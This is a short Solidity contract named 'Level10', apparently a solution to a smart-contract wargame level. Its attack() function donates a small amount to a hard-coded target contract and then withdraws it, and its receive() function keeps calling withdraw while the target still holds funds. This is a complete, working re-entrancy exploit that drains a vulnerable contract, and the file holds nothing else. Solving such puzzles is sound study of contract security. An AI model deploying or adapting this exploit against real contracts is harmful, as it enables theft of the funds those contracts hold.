// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Level10 {
    address addr = 0x858F548d98CC78901Ff4dEd865E20b7d4Dc81567;

    constructor() payable {}

    receive() external payable {
        uint256 bal = addr.balance;
        if (bal >= 0.0002 ether) {
            (bool b,) = address(addr).call(abi.encodeWithSignature("withdraw(uint256)", 0.0002 ether));
            require(b);
        }
    }

    function attack() public {
        (bool a,) = address(addr).call{value: 0.0002 ether}(abi.encodeWithSignature("donate(address)", address(this)));
        require(a);
        (bool b,) = address(addr).call(abi.encodeWithSignature("withdraw(uint256)", 0.0002 ether));
        require(b);
    }
}
